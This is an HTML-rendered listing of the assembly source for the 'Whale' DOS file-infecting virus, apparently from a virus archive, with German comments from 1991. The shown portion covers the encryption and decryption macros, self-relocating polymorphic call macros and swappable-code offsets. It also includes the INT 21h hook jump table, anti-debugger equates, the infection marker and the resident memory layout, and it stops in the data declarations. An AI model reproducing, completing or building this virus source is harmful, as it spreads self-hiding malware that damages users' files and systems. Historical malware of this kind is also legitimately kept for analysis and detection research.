<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Whale.b - WHALE.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;       The WHALE                                                    ;</span><span class="sc0">
</span><span class="sc1">;                                                                    ;</span><span class="sc0">
</span><span class="sc1">;       Listing erstellt 1991 , R. Hîrner , Karlsruhe , FRGDR        ;</span><span class="sc0">
</span><span class="sc1">;                                                                    ;</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0">            </span><span class="sc9">SEGMENT</span><span class="sc0">
                </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
                </span><span class="sc9">.RADIX</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;----------------( Struktur der Entscheidungs-Tabelle fÅr INT 21h )---</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">IF_THEN</span><span class="sc0">         </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">WENN</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DANN</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc1">;==========================================( Der Decoder-Aufruf   )===</span><span class="sc0">
</span><span class="sc5">MDECODE</span><span class="sc0">         </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">Adr</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DECODE</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc5">@L</span><span class="sc4">&amp;</span><span class="sc5">adr</span><span class="sc4">-</span><span class="sc5">L</span><span class="sc4">&amp;</span><span class="sc5">Adr</span><span class="sc0">
</span><span class="sc5">L</span><span class="sc4">&amp;</span><span class="sc5">Adr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;==========================================( der Coder-Aufruf     )===</span><span class="sc0">
</span><span class="sc5">MCODE</span><span class="sc0">           </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">Adr</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CODEIT</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">@L</span><span class="sc4">&amp;</span><span class="sc5">Adr</span><span class="sc4">-</span><span class="sc5">L</span><span class="sc4">&amp;</span><span class="sc5">Adr</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">@L</span><span class="sc4">&amp;</span><span class="sc5">Adr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------( fÅr Mutanten )---</span><span class="sc0">
</span><span class="sc5">L04BB5</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">D4BB5</span><span class="sc0">
</span><span class="sc5">J00000</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">L04BB5</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Entry</span><span class="sc0">
</span><span class="sc5">J11111</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">L04BB5</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">@INT21</span><span class="sc0">
</span><span class="sc5">ZweiByte</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">J00000</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">DreiByte</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">J00000</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">M_Size</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J03AD0</span><span class="sc4">-</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J03A84</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------( "Mutierende" Makros )---</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CALL_INT21</span><span class="sc0">      </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">Adr</span><span class="sc4">,</span><span class="sc5">adr1</span><span class="sc0">                </span><span class="sc1">; Selbst-Relozierend</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E8H</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">LL</span><span class="sc4">&amp;</span><span class="sc5">ADR</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">J11111</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">LL</span><span class="sc4">&amp;</span><span class="sc5">ADR</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ADR1</span><span class="sc0">
                </span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CALL_ENTRY</span><span class="sc0">      </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">Adr</span><span class="sc4">,</span><span class="sc5">adr1</span><span class="sc0">                </span><span class="sc1">; Selbst-Relozierend</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E8H</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">CE</span><span class="sc4">&amp;</span><span class="sc5">ADR</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">J00000</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">CE</span><span class="sc4">&amp;</span><span class="sc5">ADR</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ADR1</span><span class="sc0">
                </span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">JMP_ENTRY</span><span class="sc0">       </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">Adr</span><span class="sc4">,</span><span class="sc5">adr1</span><span class="sc0">                </span><span class="sc1">; Selbst-Relozierend</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E9H</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">JM</span><span class="sc4">&amp;</span><span class="sc5">ADR</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">J00000</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">JM</span><span class="sc4">&amp;</span><span class="sc5">ADR</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ADR1</span><span class="sc0">
                </span><span class="sc9">ENDM</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===============================================( zur relozierung )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">FirstByte</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">@FirstByte</span><span class="sc4">-</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">      </span><span class="sc1">;   20h</span><span class="sc0">
</span><span class="sc5">CODE_LEN</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">LASTCODE</span><span class="sc4">-</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">@FirstByte</span><span class="sc0">      </span><span class="sc1">; 2385H</span><span class="sc0">
</span><span class="sc5">CODE_START</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J04BCF</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">@FirstByte</span><span class="sc0">      </span><span class="sc1">; 239FH</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;============================================( verÑnderlicher Code)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">SwapCode_1</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Decode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">        </span><span class="sc1">; 0A33h</span><span class="sc0">
</span><span class="sc5">Swapcode_2</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J03A20</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">        </span><span class="sc1">; 1210h</span><span class="sc0">
</span><span class="sc5">Swapcode_3</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J0491A</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J03047</span><span class="sc0">          </span><span class="sc1">; 18D3h</span><span class="sc0">
</span><span class="sc5">SwapCode_4</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J03047</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">        </span><span class="sc1">; 0837H</span><span class="sc0">
</span><span class="sc5">SwapCode_5</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J03259</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">        </span><span class="sc1">; 0A49h</span><span class="sc0">
</span><span class="sc5">SwapCode_6</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J02CFF</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">        </span><span class="sc1">; 04EFh</span><span class="sc0">
</span><span class="sc5">SwapCode_7</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">SwitchByte</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">SwapCode_8</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Int_02</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">        </span><span class="sc1">; 3181h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;========================================( einfacher zu schreiben )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">XorByte__1</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">D_4A5E</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">        </span><span class="sc1">; 224Eh</span><span class="sc0">
</span><span class="sc5">XorByte__2</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">D_4A79</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">        </span><span class="sc1">; 2269h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Part_____1</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">D4BAC</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">        </span><span class="sc1">; 239Ch</span><span class="sc0">
</span><span class="sc5">Len_Part_1</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Lastbyte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">D4BAC</span><span class="sc0">         </span><span class="sc1">; 0054h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">SchwimmZiel</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J029C1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">        </span><span class="sc1">; 01B1h</span><span class="sc0">
</span><span class="sc5">WischeWeg</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">D4B7C</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">        </span><span class="sc1">; 236Ch</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">SS_INIT</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">EXE_SS_INIT</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
</span><span class="sc5">SP_INIT</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">EXE_SP_INIT</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
</span><span class="sc5">CODE_INIT</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">EXE_CODE_INIT</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=============================( Sprungtabelle fÅr Int 21h-Handler )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">L0699</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J02ea9</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
</span><span class="sc5">L04f4</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J02D04</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
</span><span class="sc5">L06E0</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J02EF0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
</span><span class="sc5">L06CA</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J02EDA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
</span><span class="sc5">L08CF</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J030DF</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
</span><span class="sc5">L06C8</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J02ED8</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
</span><span class="sc5">L0996</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J031A6</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
</span><span class="sc5">L09E4</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J031F4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
</span><span class="sc5">L1E5E</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J0466E</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
</span><span class="sc5">L1DA2</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J045B2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
</span><span class="sc5">L0AD4</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J0325D</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
</span><span class="sc5">L1F70</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J04780</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
</span><span class="sc5">L1D0F</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J0451F</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==============================( wenn ein Debugger erkannt wird...)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">IfDebugWal</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J04B6A</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">CreateTempCode</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">StartDebug</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">      </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">CreateTempCode</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==========================================( ErklÑrung fehlt noch )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">@0478</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0478H</span><span class="sc0">
</span><span class="sc5">@FB88</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">10000h</span><span class="sc4">-</span><span class="sc5">@0478</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=================================================( COM-Einsprung )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">ENTRY</span><span class="sc0">           </span><span class="sc1">; JMP     Decode_Whale</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">Whale_ID</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">020CCh</span><span class="sc0">          </span><span class="sc1">; kennung, da· File infiziert</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">2300h</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0">       </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       DIESE DATEN WERDEN ZWAR **VOR** DEN CODE</span><span class="sc0">
</span><span class="sc1">;       ASSEMBLIERT,  ABER ***HINTER*** DEM CODE ABGELEGT !!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       DAS IST DER ***EINZIGE GRUND*** WARUM DIE VIELEN</span><span class="sc0">
</span><span class="sc1">;       NULL-BYTES VOR DEM WAL STEHEN !!!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       DER CODE IST Code_len BYTE LANG.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       AB OFFSET Code_len DöRFEN ALSO DATEN STEHEN.</span><span class="sc0">
</span><span class="sc1">;       DESHALB GIBT ES AUCH KEINE DATEN, DIE ***VOR*** DIESEM</span><span class="sc0">
</span><span class="sc1">;       OFFSET ABGELEGT WERDEN !</span><span class="sc0">
</span><span class="sc1">;====================================================================</span><span class="sc0">
</span><span class="sc1">;===========================================( Speichereinteilung )===</span><span class="sc0">
</span><span class="sc1">;====================================================================</span><span class="sc0">
</span><span class="sc1">;       Assemblierungszeit :   Zur Laufzeit (resident):</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       +-CS:0100=DS:0100-+    +--CS:0000-DS:2810-+  &lt;- Segment 9D90h</span><span class="sc0">
</span><span class="sc1">;       |                 |    |  Code            |</span><span class="sc0">
</span><span class="sc1">;       |    Leer         |    |                  |</span><span class="sc0">
</span><span class="sc1">;       |                 |    |                  |</span><span class="sc0">
</span><span class="sc1">;       +-CS:2400=DS:2400-+    +--CS:2400-DS:4C10-+ (DS:4C43=CS:2433!)</span><span class="sc0">
</span><span class="sc1">;       |    Daten        |    |  DATEN           |</span><span class="sc0">
</span><span class="sc1">;       +-CS:2700=DS:2700-+    +--CS:2700-DS:4F10-+  &lt;--Speicherbedarf</span><span class="sc0">
</span><span class="sc1">;       |    Leer         |    |  Grafikkarte     |  incl. Zugriff auf</span><span class="sc0">
</span><span class="sc1">;       +-CS:2800=DS:2800-+    |                  |      residenten</span><span class="sc0">
</span><span class="sc1">;       | Save-Daten+Code |    |                  |     COMMAND.COM</span><span class="sc0">
</span><span class="sc1">;       +-CS:2810=DS:2810-+    |                  |</span><span class="sc0">
</span><span class="sc1">;       |                 |    |                  |</span><span class="sc0">
</span><span class="sc1">;       |    Code         |    |                  |</span><span class="sc0">
</span><span class="sc1">;       |                 |    |                  |</span><span class="sc0">
</span><span class="sc1">;       +-CS:4c00=DS:4C00-+    +------------------+</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">OFFSET_2400</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">CodBuf</span><span class="sc0">          </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">1Ch</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; Wirts-File-Beginn / Puffer</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">D241C</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D241D</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D241E</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D2420</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D2422</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">D2424</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Adresse des exec-param-blocks</span><span class="sc0">
</span><span class="sc5">D2428</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; Drive des aktuellen Files</span><span class="sc0">
</span><span class="sc5">FileTime</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; File-Uhrzeit</span><span class="sc0">
</span><span class="sc5">FileDate</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; File-Datum</span><span class="sc0">
